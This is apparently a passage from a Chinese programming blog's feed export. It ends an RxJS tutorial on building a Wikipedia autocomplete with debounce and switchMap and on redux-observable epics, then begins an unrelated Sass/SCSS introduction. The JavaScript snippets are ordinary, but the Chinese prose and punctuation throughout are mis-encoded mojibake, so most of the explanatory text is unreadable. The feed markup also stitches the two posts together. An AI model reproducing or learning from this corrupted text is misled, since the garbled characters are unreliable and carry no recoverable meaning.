é€™é‚Šç”¨flatMapçš„åŸå› è·Ÿå‰›æ‰çš„ç•«åœ–ç¯„ä¾‹ä¸€æ¨£ï¼Œæˆ‘å€‘è¦åœ¨æŒ‰ä¸‹æŒ‰éˆ•æ™‚ï¼ŒæŠŠåŸæœ¬çš„è³‡æ–™æµè½‰æ›æˆæ–°çš„è³‡æ–™æµï¼Œå¦‚æœåªç”¨mapçš„è©±ï¼Œæœƒè®Šæˆä¸€å€‹äºŒç¶­çš„ Observableï¼Œæ‰€ä»¥å¿…é ˆè¦ç”¨flattenæŠŠå®ƒå£“å¹³ã€‚
ä½ å¯ä»¥è©¦è©¦çœ‹æŠŠflatMapæ”¹æˆmapï¼Œä½ æœ€å¾Œ subscribe å¾—åˆ°çš„å€¼å°±æœƒæ˜¯ä¸€å † Observable è€Œä¸æ˜¯ä½ æƒ³è¦çš„è³‡æ–™ã€‚
çŸ¥é“æ€éº¼ç”¨ Rx ä¾†è™•ç† API ä¹‹å¾Œï¼Œå°±å¯ä»¥ä¾†åšä¸€å€‹ç¶“å…¸ç¯„ä¾‹äº†ï¼šAutoCompleteã€‚
æˆ‘åœ¨åšé€™å€‹ç¯„ä¾‹çš„æ™‚å€™æœ‰æ¥µå¤§éƒ¨åˆ†åƒè€ƒ30 å¤©ç²¾é€š RxJS(19): å¯¦å‹™ç¯„ä¾‹ - ç°¡æ˜“ Auto Complete å¯¦ä½œã€Reactive Programming ç°¡ä»‹èˆ‡æ•™å­¸(ä»¥ RxJS ç‚ºä¾‹)ä»¥åŠæ„å»ºæµå¼åº”ç”¨â€”RxJSè¯¦è§£ï¼Œå†æ¬¡æ„Ÿè¬é€™ä¸‰ç¯‡æ–‡ç« ã€‚

ç‚ºäº†è¦è®“å¤§å®¶èƒ½å¤ é«”æœƒ Reactive Programming è·Ÿä¸€èˆ¬çš„æœ‰ä»€éº¼ä¸ä¸€æ¨£ï¼Œæˆ‘å€‘å…ˆç”¨è€æ–¹æ³•åšå‡ºé€™å€‹ Auto Complete çš„åŠŸèƒ½å§ï¼
å…ˆä¾†å¯«ä¸€ä¸‹æœ€åº•å±¤çš„å…©å€‹å‡½å¼ï¼Œè² è²¬æŠ“è³‡æ–™çš„ä»¥åŠ render å»ºè­°æ¸…å–®çš„ï¼Œæˆ‘å€‘ä½¿ç”¨ç¶­åŸºç™¾ç§‘çš„ API ä¾†ç•¶ä½œç¯„ä¾‹ï¼š
function searchWikipedia (term) &#123;    return $.ajax(&#123;        url: &#x27;http://en.wikipedia.org/w/api.php&#x27;,        dataType: &#x27;jsonp&#x27;,        data: &#123;            action: &#x27;opensearch&#x27;,            format: &#x27;json&#x27;,            search: term        &#125;    &#125;).promise();&#125;  function renderList (list) &#123;  $(&#x27;.auto-complete__list&#x27;).empty();  $(&#x27;.auto-complete__list&#x27;).append(list.map(item =&gt; &#x27;&lt;li&gt;&#x27; + item + &#x27;&lt;/li&gt;&#x27;))&#125;

é€™é‚Šè¦æ³¨æ„çš„ä¸€å€‹é»æ˜¯ç¶­åŸºç™¾ç§‘å›å‚³çš„è³‡æ–™æœƒæ˜¯ä¸€å€‹é™£åˆ—ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š
[ä½ è¼¸å…¥çš„é—œéµå­—, é—œéµå­—æ¸…å–®, æ¯å€‹é—œéµå­—çš„ä»‹ç´¹, æ¯å€‹é—œéµå­—çš„é€£çµ]  // ç¯„ä¾‹ï¼š[  &quot;dd&quot;,  [&quot;Dd&quot;, &quot;DDR3 SDRAM&quot;, &quot;DD tank&quot;],  [&quot;&quot;, &quot;Double data rate type three SDRAM (DDR3 SDRAM)&quot;, &quot;DD or Duplex Drive tanks&quot;],  [https://en.wikipedia.org/wiki/Dd&quot;, &quot;https://en.wikipedia.org/wiki/DDR3_SDRAM&quot;, &quot;...ç•¥&quot;]]

åœ¨æˆ‘å€‘çš„ç°¡å–®ç¤ºç¯„ä¸­ï¼Œåªéœ€è¦å– index ç‚º 1 çš„é‚£å€‹é—œéµå­—æ¸…å–®å°±å¥½äº†ã€‚è€ŒrenderListé€™å€‹ function å‰‡æ˜¯å‚³é€²ä¸€å€‹é™£åˆ—ï¼Œå°±æœƒæŠŠé™£åˆ—å…§å®¹è½‰æˆlié¡¯ç¤ºå‡ºä¾†ã€‚
æœ‰äº†é€™å…©å€‹æœ€åŸºç¤çš„ function ä¹‹å¾Œï¼Œå°±å¯ä»¥å¾ˆè¼•æ˜“åœ°å®Œæˆ Auto Complete çš„åŠŸèƒ½ï¼š
document.querySelector(&#x27;.auto-complete input&#x27;).addEventListener(&#x27;input&#x27;, (e) =&gt; &#123;  searchWikipedia(e.target.value).then((data) =&gt; &#123;    renderList(data[1])  &#125;)&#125;)

ç¨‹å¼ç¢¼æ‡‰è©²å¾ˆå¥½æ‡‚ï¼Œå°±æ˜¯æ¯æ¬¡æŒ‰ä¸‹è¼¸å…¥æ±è¥¿çš„æ™‚å€™å» call apiï¼ŒæŠŠå›å‚³çš„è³‡æ–™é¤µçµ¦renderListå»æ¸²æŸ“ã€‚
æœ€åŸºæœ¬çš„åŠŸèƒ½å®Œæˆäº†ï¼Œæˆ‘å€‘è¦ä¾†åšä¸€é»å„ªåŒ–ï¼Œå› ç‚ºé€™æ¨£å­çš„å¯¦ä½œå…¶å¯¦æ˜¯æœ‰ä¸€äº›å•é¡Œçš„ã€‚
ç¬¬ä¸€å€‹å•é¡Œï¼Œç¾åœ¨åªè¦æ¯æ‰“ä¸€å€‹å­—å°±æœƒé€å‡ºä¸€å€‹ requestï¼Œå¯æ˜¯é€™æ¨£åšå…¶å¯¦æœ‰é»æµªè²»ï¼Œå› ç‚ºä½¿ç”¨è€…å¯èƒ½å¿«é€Ÿçš„è¼¸å…¥äº†ï¼šjavaæƒ³è¦æ‰¾ç›¸é—œçš„è³‡æ–™ï¼Œä»–æ ¹æœ¬ä¸åœ¨ä¹jã€jaã€javé€™ä¸‰å€‹ requestã€‚
è¦æ€éº¼åšå‘¢ï¼Ÿæˆ‘å€‘å°±æ”¹å¯«æˆå¦‚æœ 250ms è£¡é¢æ²’æœ‰å†è¼¸å…¥æ–°çš„æ±è¥¿æ‰ç™¼é€ request å°±å¥½ï¼Œå°±å¯ä»¥é¿å…é€™ç¨®å¤šé¤˜çš„æµªè²»ã€‚
é€™ç¨®æŠ€å·§ç¨±ä½œdebounceï¼Œå¯¦ä½œä¸Šä¹Ÿå¾ˆç°¡å–®ï¼Œå°±æ˜¯åˆ©ç”¨setTimeoutè·ŸclearTimeoutã€‚
var timer = null;document.querySelector(&#x27;.auto-complete input&#x27;).addEventListener(&#x27;input&#x27;, (e) =&gt; &#123;  if (timer) &#123;    clearTimeout(timer);  &#125;  timer = setTimeout(() =&gt; &#123;    searchWikipedia(e.target.value).then((data) =&gt; &#123;      renderList(data[1])    &#125;)  &#125;, 250)&#125;)

åœ¨ input äº‹ä»¶è¢«è§¸ç™¼ä¹‹å¾Œï¼Œæˆ‘å€‘ä¸ç›´æ¥åšäº‹æƒ…ï¼Œè€Œæ˜¯è¨­ç½®äº†ä¸€å€‹ 250ms éå¾Œæœƒè§¸ç™¼çš„ timerï¼Œå¦‚æœ 250ms å…§ input å†æ¬¡è¢«è§¸ç™¼çš„è©±ï¼Œæˆ‘å€‘å°±æŠŠä¸Šæ¬¡çš„ timer æ¸…æ‰ï¼Œå†é‡æ–°è¨­ç½®ä¸€å€‹ã€‚
å¦‚æ­¤ä¸€ä¾†ï¼Œå°±å¯ä»¥ä¿è­‰ä½¿ç”¨è€…å¦‚æœåœ¨çŸ­æ™‚é–“å…§ä¸æ–·è¼¸å…¥æ–‡å­—çš„è©±ï¼Œä¸æœƒé€å‡ºç›¸å°æ‡‰çš„ requestï¼Œè€Œæ˜¯æœƒç­‰åˆ°æœ€å¾Œä¸€å€‹å­—æ‰“å®Œä¹‹å¾Œçš„ 250 ms æ‰ç™¼å‡º requestã€‚
è§£æ±ºäº†ç¬¬ä¸€å€‹å•é¡Œä¹‹å¾Œï¼Œé‚„æœ‰ä¸€å€‹æ½›åœ¨çš„å•é¡Œéœ€è¦è§£æ±ºã€‚
å‡è¨­æˆ‘ç¾åœ¨è¼¸å…¥aï¼Œæ¥è‘—åˆªé™¤ç„¶å¾Œå†è¼¸å…¥bï¼Œæ‰€ä»¥ç¬¬ä¸€å€‹ request æœƒæ˜¯açš„çµæœï¼Œç¬¬äºŒå€‹ request æœƒæ˜¯bçš„çµæœã€‚æˆ‘å€‘å‡è¨­ server å‡ºäº†ä¸€é»å•é¡Œï¼Œæ‰€ä»¥ç¬¬äºŒå€‹çš„ response åè€Œæ¯”ç¬¬ä¸€å€‹é‚„å…ˆåˆ°é”ï¼ˆå¯èƒ½bçš„æœå°‹çµæœæœ‰ cache ä½†æ˜¯aæ²’æœ‰ï¼‰ï¼Œé€™æ™‚å€™å°±æœƒå…ˆé¡¯ç¤ºbçš„å…§å®¹ï¼Œç­‰åˆ°ç¬¬ä¸€å€‹ response å›ä¾†æ™‚ï¼Œå†é¡¯ç¤ºaçš„å…§å®¹ã€‚
å¯æ˜¯é€™æ¨£ UI å°±æœ‰å•é¡Œäº†ï¼Œæˆ‘æ˜æ˜è¼¸å…¥çš„æ˜¯bï¼Œæ€éº¼ auto complete çš„æ¨è–¦é—œéµå­—æ˜¯aé–‹é ­ï¼Ÿ
æ‰€ä»¥æˆ‘å€‘å¿…é ˆè¦åšå€‹æª¢æŸ¥ï¼Œæª¢æŸ¥è¿”å›çš„è³‡æ–™è·Ÿæˆ‘ç¾åœ¨è¼¸å…¥çš„è³‡æ–™æ˜¯ä¸æ˜¯ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´çš„è©±æ‰ renderï¼š
var timer = null;document.querySelector(&#x27;.auto-complete input&#x27;).addEventListener(&#x27;input&#x27;, (e) =&gt; &#123;  if (timer) &#123;    clearTimeout(timer);  &#125;  timer = setTimeout(() =&gt; &#123;    searchWikipedia(e.target.value).then((data) =&gt; &#123;      if (data[0] === document.querySelector(&#x27;.auto-complete input&#x27;).value) &#123;        renderList(data[1])      &#125;    &#125;)  &#125;, 250)&#125;)

åˆ°é€™è£¡æ‡‰è©²å°±å·®ä¸å¤šäº†ï¼Œè©²æœ‰çš„åŠŸèƒ½éƒ½æœ‰äº†ã€‚
æ¥è‘—ï¼Œè®“æˆ‘å€‘ä¾†æŒ‘æˆ°ç”¨ RxJS å¯¦ä½œå§ï¼
é¦–å…ˆï¼Œå…ˆå¾ç°¡å–®ç‰ˆçš„é–‹å§‹åšï¼Œå°±æ˜¯ä¸åŒ…å« debounce è·Ÿä¸Šé¢ API é †åºå•é¡Œçš„å¯¦ä½œï¼Œç›£è½ input äº‹ä»¶è½‰æ›æˆ requestï¼Œç„¶å¾Œç”¨flatMapå£“å¹³ï¼Œå…¶å¯¦å°±è·Ÿä¸Šé¢çš„æµç¨‹å·®ä¸å¤šï¼š
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .map(e =&gt; e.target.value)  .flatMap(value =&gt; &#123;    return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

é€™é‚Šç”¨äº†å…©å€‹mapï¼Œä¸€å€‹æ˜¯æŠŠeè½‰æˆe.target.valueï¼Œä¸€å€‹æ˜¯æŠŠå‚³å›ä¾†çš„çµæœè½‰æˆres[1]ï¼Œå› ç‚ºæˆ‘å€‘åªéœ€è¦é—œéµå­—åˆ—è¡¨ï¼Œå…¶ä»–çš„æ±è¥¿å…¶å¯¦éƒ½ä¸ç”¨ã€‚
é‚£è¦å¦‚ä½•å¯¦ä½œdebounceçš„åŠŸèƒ½å‘¢ï¼Ÿ
RxJS å·²ç¶“å¹«ä½ å¯¦ä½œå¥½äº†ï¼Œæ‰€ä»¥ä½ åªè¦åŠ ä¸Š.debounceTime(250)å°±å¥½äº†ï¼Œå°±æ˜¯é€™éº¼ç°¡å–®ã€‚
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .debounceTime(250)  .map(e =&gt; e.target.value)  .flatMap(value =&gt; &#123;    return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

é‚„æœ‰æœ€å¾Œä¸€å€‹å•é¡Œè¦è§£æ±ºï¼Œé‚£å°±æ˜¯å‰›æ‰æåˆ°çš„ request çš„é †åºå•é¡Œã€‚
Observable æœ‰ä¸€å€‹ä¸åŒçš„è§£æ³•ï¼Œæˆ‘ä¾†è§£é‡‹çµ¦å¤§å®¶è½è½ã€‚
å…¶å¯¦é™¤äº†flatMapä»¥å¤–ï¼Œé‚„æœ‰å¦å¤–ä¸€ç¨®æ–¹å¼å«åšswitchMapï¼Œä»–å€‘çš„å·®åˆ¥åœ¨æ–¼è¦æ€éº¼æŠŠ Observable çµ¦å£“å¹³ã€‚å‰è€…æˆ‘å€‘ä¹‹å‰ä»‹ç´¹éäº†ï¼Œå°±æ˜¯æœƒæŠŠæ¯ä¸€å€‹äºŒç¶­çš„ Observable éƒ½å£“å¹³ï¼Œä¸¦ä¸”ã€Œæ¯ä¸€å€‹éƒ½åŸ·è¡Œã€ã€‚
è€ŒswitchMapçš„å·®åˆ¥åœ¨æ–¼ï¼Œä»–æ°¸é åªæœƒè™•ç†æœ€å¾Œä¸€å€‹ Observableã€‚æ‹¿æˆ‘å€‘çš„ä¾‹å­ä¾†èªªï¼Œå‡è¨­ç¬¬ä¸€å€‹ request é‚„æ²’å›ä¾†çš„æ™‚å€™ï¼Œç¬¬äºŒå€‹ request å°±ç™¼å‡ºå»äº†ï¼Œé‚£æˆ‘å€‘çš„ Observable å°±åªæœƒè™•ç†ç¬¬äºŒå€‹ requestï¼Œè€Œä¸ç®¡ç¬¬ä¸€å€‹ã€‚
ç¬¬ä¸€å€‹é‚„æ˜¯æœƒç™¼é€ï¼Œé‚„æ˜¯æœƒæ¥æ”¶åˆ°è³‡æ–™ï¼Œåªæ˜¯æ¥æ”¶åˆ°è³‡æ–™ä»¥å¾Œä¸æœƒå†æŠŠé€™å€‹è³‡æ–™ emit åˆ° Observable ä¸Šé¢ï¼Œæ„æ€å°±æ˜¯æ ¹æœ¬æ²’äººç†é€™å€‹è³‡æ–™äº†ã€‚
å¯ä»¥çœ‹ä¸€ä¸‹ç°¡é™‹çš„åœ–è§£ï¼ŒflatMapæ¯ä¸€å€‹ promise resolve ä¹‹å¾Œçš„è³‡æ–™éƒ½æœƒè¢«ç™¼é€åˆ°æˆ‘å€‘çš„ Observable ä¸Šé¢ï¼š

è€ŒswitchMapåªæœƒè™•ç†æœ€å¾Œä¸€å€‹ï¼š

æ‰€ä»¥æˆ‘å€‘åªè¦æŠŠflatMapæ”¹æˆswitchMapï¼Œå°±å¯ä»¥æ°¸é åªé—œæ³¨æœ€å¾Œä¸€å€‹ç™¼é€çš„ requestï¼Œä¸ç”¨å»ç®¡ request å‚³å›ä¾†çš„é †åºï¼Œå› ç‚ºå‰é¢çš„ request éƒ½è·Ÿé€™å€‹ Observable ç„¡é—œäº†ã€‚
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .debounceTime(250)  .map(e =&gt; e.target.value)  .switchMap(value =&gt; &#123;    return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

åšåˆ°é€™é‚Šï¼Œå°±è·Ÿå‰›å‰›å¯¦ä½œçš„åŠŸèƒ½ä¸€æ¨¡ä¸€æ¨£äº†ã€‚
ä½†å…¶å¯¦é‚„æœ‰åœ°æ–¹å¯ä»¥æ”¹é€²ï¼Œæˆ‘å€‘ä¾†åšå€‹å°å°çš„åŠ å¼·å¥½äº†ã€‚ç¾åœ¨çš„è©±ç•¶æˆ‘è¼¸å…¥abcï¼Œæœƒå‡ºç¾abcçš„ç›¸é—œé—œéµå­—ï¼Œæ¥è‘—æˆ‘æŠŠabcå…¨éƒ¨åˆªæ‰ï¼Œè®“ input è®Šæˆç©ºç™½ï¼Œæœƒç™¼ç¾ API é€™æ™‚å€™å›å‚³ä¸€å€‹éŒ¯èª¤ï¼šThe &quot;search&quot; parameter must be set.ã€‚
å› æ­¤ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ input æ˜¯ç©ºçš„æ™‚å€™ï¼Œä¸ç™¼é€ requestï¼Œåªå›å‚³ä¸€å€‹ç©ºé™£åˆ—ï¼Œè€Œå›å‚³ç©ºé™£åˆ—é€™ä»¶äº‹æƒ…å¯ä»¥ç”¨Rx.Observable.of([])ä¾†å®Œæˆï¼Œé€™æ¨£æœƒå‰µé€ ä¸€å€‹æœƒç™¼é€ç©ºé™£åˆ—çš„ Observableï¼š
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .debounceTime(250)  .map(e =&gt; e.target.value)  .switchMap(value =&gt; &#123;    return value.length &lt; 1 ? Rx.Observable.of([]) : Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

é‚„æœ‰ä¸€å€‹é»æ“Šé—œéµå­—æ¸…å–®ä¹‹å¾ŒæŠŠæ–‡å­—è¨­å®šæˆé—œéµå­—çš„åŠŸèƒ½ï¼Œåœ¨é€™é‚Šå°±ä¸ç¤ºç¯„çµ¦å¤§å®¶çœ‹äº†ï¼Œä½†å…¶å¯¦å°±æ˜¯å†å‰µé€ ä¸€å€‹ Observable å»ç›£è½é»æ“Šäº‹ä»¶ï¼Œé»åˆ°çš„æ™‚å€™å°±è¨­å®šæ–‡å­—ä¸¦ä¸”æŠŠé—œéµå­—æ¸…å–®çµ¦æ¸…æ‰ã€‚
æˆ‘ç›´æ¥é™„ä¸Šåƒè€ƒç¨‹å¼ç¢¼ï¼š
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete__list&#x27;), &#x27;click&#x27;)  .filter(e =&gt; e.target.matches(&#x27;li&#x27;))  .map(e =&gt; e.target.innerHTML)  .subscribe(value =&gt; &#123;    document.querySelector(&#x27;.auto-complete input&#x27;).value = value;    renderList([])  &#125;)

é›–ç„¶æˆ‘åªä»‹ç´¹äº†æœ€åŸºæœ¬çš„æ“ä½œï¼Œä½† RxJS çš„å¼·å¤§ä¹‹è™•å°±åœ¨æ–¼é™¤äº†é€™äº›ï¼Œä½ ç”šè‡³é‚„æœ‰retryå¯ä»¥ç”¨ï¼Œåªè¦è¼•é¬†åŠ ä¸Šé€™å€‹ï¼Œå°±èƒ½å¤ æœ‰è‡ªå‹•é‡è©¦çš„åŠŸèƒ½ã€‚
ç›¸é—œçš„æ‡‰ç”¨å ´æ™¯é‚„æœ‰å¾ˆå¤šï¼Œåªè¦æ˜¯è·Ÿ API æœ‰é—œé€£çš„å¹¾ä¹éƒ½å¯ä»¥ç”¨ RxJS å¾ˆå„ªé›…çš„è§£æ±ºã€‚
React + Redux çš„éåŒæ­¥è§£æ±ºæ–¹æ¡ˆï¼šredux-observableé€™æ˜¯æˆ‘å€‘ä»Šå¤©çš„æœ€å¾Œä¸€å€‹ä¸»é¡Œäº†ï¼Œä¹Ÿæ˜¯æˆ‘é–‹å ´æ‰€æåˆ°çš„ã€‚
React + Redux é€™ä¸€å¥—éå¸¸å¸¸è¦‹çš„çµ„åˆï¼Œä¸€ç›´éƒ½æœ‰ä¸€å€‹å•é¡Œå­˜åœ¨ï¼Œé‚£å°±æ˜¯æ²’æœ‰è¦ç¯„éåŒæ­¥è¡Œç‚ºï¼ˆä¾‹å¦‚èªª APIï¼‰åˆ°åº•æ‡‰è©²æ€éº¼è™•ç†ã€‚è€Œé–‹æºç¤¾ç¾¤ä¹Ÿæœ‰è¨±å¤šä¸åŒçš„è§£æ±ºæ–¹æ¡ˆï¼Œä¾‹å¦‚èªª redux-thunkã€redux-promiseã€redux-saga ç­‰ç­‰ã€‚
æˆ‘å€‘å‰é¢è¬›äº†é€™éº¼å¤šæ±è¥¿ï¼Œèˆ‰äº†é€™éº¼å¤šç¯„ä¾‹ï¼Œå°±æ˜¯è¦è­‰æ˜çµ¦å¤§å®¶çœ‹ Reactive programming å¾ˆé©åˆæ‹¿ä¾†è§£æ±ºè¤‡é›œçš„éåŒæ­¥å•é¡Œã€‚å› æ­¤ï¼ŒNetflix å°±é–‹æºäº†é€™å¥—redux-observableï¼Œç”¨ RxJS ä¾†è™•ç†éåŒæ­¥è¡Œç‚ºã€‚
åœ¨ç­è§£ RxJS ä¹‹å¾Œï¼Œå¯ä»¥å¾ˆè¼•é¬†çš„ç†è§£redux-observableçš„åŸç†ã€‚
åœ¨ redux çš„æ‡‰ç”¨è£¡é¢ï¼Œæ‰€æœ‰çš„ action éƒ½æœƒé€šé middlewareï¼Œä½ å¯ä»¥åœ¨é€™é‚Šå° action åšä»»ä½•è™•ç†ã€‚æˆ–è€…æˆ‘å€‘ä¹Ÿå¯ä»¥æŠŠ action çœ‹åšæ˜¯ä¸€å€‹ Observableï¼Œä¾‹å¦‚èªªï¼š
// ç¯„ä¾‹è€Œå·²Rx.Observable.from(actionStreams)  .subscribe(action =&gt; &#123;    console.log(action.type, action.payload)  &#125;)

æœ‰äº†é€™å€‹ä»¥å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥åšä¸€äº›å¾ˆæœ‰è¶£çš„äº‹æƒ…ï¼Œä¾‹å¦‚èªªåµæ¸¬åˆ°æŸå€‹ action çš„æ™‚å€™ï¼Œæˆ‘å€‘å°±ç™¼é€ requestï¼Œä¸¦ä¸”æŠŠ response æ”¾é€²å¦å¤–ä¸€å€‹ action è£¡é¢é€å‡ºå»ã€‚
Rx.Observable.from(actionStreams)  .filter(action =&gt; action.type === &#x27;GET_USER_INFO&#x27;)  .switchMap(    action =&gt; Rx.Observable.from(API.getUserInfo(action.payload.userId))  )  .subscribe(userInfo =&gt; &#123;    dispatch(&#123;      type: &#x27;SET_USER_INFO&#x27;,      payload: userInfo    &#125;)  &#125;)

ä¸Šé¢å°±æ˜¯ä¸€å€‹ç°¡å–®çš„ä¾‹å­ï¼Œä½†å…¶å¯¦redux-observableå·²ç¶“å¹«æˆ‘å€‘è™•ç†æ‰å¾ˆå¤šæ±è¥¿äº†ï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦è¨˜å¾—ä¸€å€‹æ¦‚å¿µï¼š

action in, action out

redux-observable æ˜¯ä¸€å€‹ middlewareï¼Œä½ å¯ä»¥åœ¨è£¡é¢åŠ ä¸Šå¾ˆå¤šepicï¼Œæ¯ä¸€å€‹epicå°±æ˜¯ä¸€å€‹ Observableï¼Œä½ å¯ä»¥ç›£è½æŸä¸€å€‹æŒ‡å®šçš„ actionï¼Œåšä¸€äº›è™•ç†ï¼Œå†è½‰æˆå¦å¤–ä¸€å€‹ actionã€‚
ç›´æ¥çœ‹ç¨‹å¼ç¢¼æœƒæ¯”è¼ƒå¥½æ‡‚ï¼š
import Actions from &#x27;./actions/user&#x27;;import ActionTypes from &#x27;./actionTypes/user&#x27;const getUserEpic = action$ =&gt;  action$.ofType(actionTypes.GET_USER)    .switchMap(      action =&gt; Rx.Observable.from(API.getUserInfo(action.payload.userId))    ).map(userInfo =&gt; Actions.setUsers(userInfo))

å¤§æ¦‚å°±æ˜¯åƒé€™æ¨£ï¼Œæˆ‘å€‘ç›£è½ä¸€å€‹ action typeï¼ˆGET_USERï¼‰ï¼Œä¸€æ¥æ”¶åˆ°çš„æ™‚å€™å°±ç™¼é€ requestï¼Œä¸¦ä¸”æŠŠçµæœè½‰ç‚ºsetUsersé€™å€‹ actionï¼Œé€™å°±æ˜¯æ‰€è¬‚çš„ action in, action outã€‚
é€™æ¨£çš„å¥½è™•æ˜¯ä»€éº¼ï¼Ÿå¥½è™•æ˜¯æ˜ç¢ºåˆ¶å®šäº†ä¸€å€‹è¦ç¯„ï¼Œç•¶ä½ çš„ component éœ€è¦è³‡æ–™çš„æ™‚å€™ï¼Œå°±é€å‡ºä¸€å€‹ get çš„ actionï¼Œé€™å€‹ action ç¶“é middleware çš„æ™‚å€™æœƒè§¸ç™¼ epicï¼Œepic ç™¼ request çµ¦ server æ‹¿è³‡æ–™ï¼Œè½‰æˆå¦å¤–ä¸€å€‹ set çš„ actionï¼Œç¶“é reducer è¨­å®šè³‡æ–™ä»¥å¾Œæ›´æ–°åˆ° component çš„ propsã€‚
å¯ä»¥çœ‹é€™å¼µæµç¨‹åœ–ï¼š

ç¸½ä¹‹å‘¢ï¼Œepicå°±æ˜¯ä¸€å€‹ Observableï¼Œä½ åªè¦ç¢ºä¿ä½ æœ€å¾Œå›å‚³çš„æ±è¥¿æ˜¯ä¸€å€‹ action å°±å¥½ï¼Œé‚£å€‹ action å°±æœƒè¢«é€åˆ° reducer å»ã€‚
ç¤™æ–¼ç¯‡å¹…çš„é—œä¿‚ï¼Œä»Šå¤©å°æ–¼redux-observableåªæ˜¯æ¦‚å¿µæ€§çš„å¸¶éå»è€Œå·²ï¼Œæ²’æœ‰æ™‚é–“å¥½å¥½ç¤ºç¯„ï¼Œä¹‹å¾Œå†ä¾†æ‰¾å€‹æ™‚é–“å¥½å¥½å¯«ä¸€ä¸‹redux-observableçš„å¯¦æˆ°æ‡‰ç”¨ã€‚
çµè«–å¾ä¸€é–‹å§‹çš„é™£åˆ—è¬›åˆ° Observableï¼Œè¬›åˆ°ç•«åœ–çš„ç¯„ä¾‹å†è¬›åˆ°ç¶“å…¸çš„ Auto Completeï¼Œæœ€å¾Œé‚„è¬›äº†redux-observableï¼Œé€™ä¸€è·¯çš„éç¨‹ä¸­ï¼Œå¸Œæœ›å¤§å®¶æœ‰é«”æœƒåˆ° Observable åœ¨è™•ç†éåŒæ­¥è¡Œç‚ºçš„å¼·å¤§ä¹‹è™•ä»¥åŠç°¡æ½”ã€‚
é€™ç¯‡çš„ç›®çš„æ˜¯å¸Œæœ›èƒ½è®“å¤§å®¶ç†è§£ Observable å¤§æ¦‚åœ¨åšä»€éº¼ï¼Œä»¥åŠä»‹ç´¹ä¸€äº›ç°¡å–®çš„æ‡‰ç”¨å ´æ™¯ï¼Œå¸Œæœ›èƒ½æä¾›ä¸€ç¯‡ç°¡å–®æ˜“æ‡‚çš„ä¸­æ–‡å…¥é–€æ–‡ç« ï¼Œè®“æ›´å¤šäººèƒ½é«”æœƒåˆ° Observable çš„å¨åŠ›ã€‚
å–œæ­¡é€™ç¯‡çš„è©±å¯ä»¥å¹«å¿™åˆ†äº«å‡ºå»ï¼Œç™¼ç¾å“ªé‚Šæœ‰å¯«éŒ¯ä¹Ÿæ­¡è¿ç•™è¨€æŒ‡æ­£ï¼Œæ„Ÿè¬ã€‚
åƒè€ƒè³‡æ–™ï¼š
30 å¤©ç²¾é€š RxJS (01)ï¼šèªè­˜ RxJSReactive Programming ç°¡ä»‹èˆ‡æ•™å­¸(ä»¥ RxJS ç‚ºä¾‹)The introduction to Reactive Programming youâ€™ve been missingæ„å»ºæµå¼åº”ç”¨â€”RxJSè¯¦è§£Epic Middleware in ReduxCombining multiple Http streams with RxJS Observables in Angular2
å½±ç‰‡ï¼šNetflix JavaScript Talks - RxJS + Redux + React &#x3D; Amazing!RxJS Quick Start with Practical ExamplesRxJS Observables Crash CourseNetflix JavaScript Talks - RxJS Version 5RxJS 5 Thinking Reactively | Ben Lesh
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>rxjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Sass/SCSS ç°¡æ˜å…¥é–€æ•™å­¸</title>
    <url>/2017/06/30/sass-scss-tutorial-introduction/</url>
    <content><![CDATA[
Sass&#x2F;SCSS ç°¡ä»‹
Sass is an extension of CSS3, adding nested rules, variables, mixins, selector inheritance, and more. Itâ€™s translated to well-formatted, standard CSS using the command line tool or a web-framework plugin.

Sassï¼ˆSyntactically Awesome StyleSheetsï¼‰æ˜¯ä¸€ç¨® CSS çš„æ“´å……ï¼Œæ˜¯ç‚º CSS çš„è¶…é›†åˆï¼ˆé€éç·¨è­¯æœƒ compiled æˆå‚³çµ± CSSï¼Œè®“ç€è¦½å™¨å¯ä»¥é–±è®€ï¼‰ã€‚ä½¿ç”¨ Sass çš„å‡ºç¾æ˜¯ç‚ºäº†è§£æ±ºåœ¨å¤§å‹å°ˆæ¡ˆæ™‚å‚³çµ± CSS æœƒé‡åˆ°çš„é‡è¤‡ã€å¯ç¶­è­·æ€§å·®ç­‰å•é¡Œï¼ˆæ–°å¢äº† nested rules, variables, mixins, selector inheritance ç­‰ç‰¹æ€§ï¼‰ã€‚è®“é–‹ç™¼è€…å¯ä»¥æ’°å¯«ç°¡æ½”ã€å¯Œèªæ„ï¼ˆexpressiveï¼‰ã€é‡è¤‡æ€§ä½³ï¼ˆreusableï¼‰ã€å¯ç¶­è­·æ€§ä½³å’Œå¯å»¶å±•æ€§ä½³çš„ CSS ç¨‹å¼ç¢¼ã€‚gem install sass
